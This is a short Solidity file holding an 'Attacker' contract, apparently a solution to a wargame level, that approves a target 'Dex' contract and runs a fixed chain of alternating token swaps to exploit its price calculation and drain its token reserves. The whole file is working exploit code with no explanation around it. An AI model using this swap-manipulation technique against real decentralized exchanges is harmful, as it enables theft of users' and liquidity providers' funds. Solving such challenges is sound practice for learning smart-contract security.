//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Level.sol";


contract Attacker {
    // assume attacker has 10 tokens each
    Dex public target;

    constructor(address _target) {
        target = Dex(_target);
    }

    function attack() external {
        address token1 = target.token1();
        address token2 = target.token2();
        target.approve(address(target),1000);

        target.swap(token1, token2, 10);
        target.swap(token2, token1, 20);
        target.swap(token1, token2, 24);
        target.swap(token2, token1, 30);
        target.swap(token1, token2, 41);
        target.swap(token2, token1, 45);
    }
}
